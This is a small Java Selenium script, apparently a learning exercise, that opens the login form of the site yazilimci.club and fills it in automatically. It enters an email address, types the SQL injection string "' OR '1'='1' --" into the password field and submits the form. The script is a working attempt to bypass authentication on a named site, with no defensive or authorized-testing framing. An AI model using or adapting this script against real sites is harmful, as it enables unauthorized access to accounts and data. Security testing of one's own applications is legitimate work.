import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.chrome.ChromeDriver;

public class ikinci {

    public static void main(String[] args) throws InterruptedException {

        System.setProperty("webdriver.chrome.driver","C:\\Program Files\\Selenium\\chromedriver\\chromedriver.exe");

        WebDriver driver = new ChromeDriver();

        driver.get("https://yazilimci.club/");

        WebElement eposta = driver.findElement(By.id("floatingInput"));
        eposta.click();
        eposta.sendKeys("abdullah@gmail.com");
        Thread.sleep(2000);

        WebElement sifre = driver.findElement(By.id("floatingPassword"));
        sifre.click();
        sifre.sendKeys("' OR '1'='1' --  ");
        Thread.sleep(2000);

        WebElement tikla = driver.findElement(By.className("btn-primary"));
        tikla.click();
        Thread.sleep(2000);
    }
}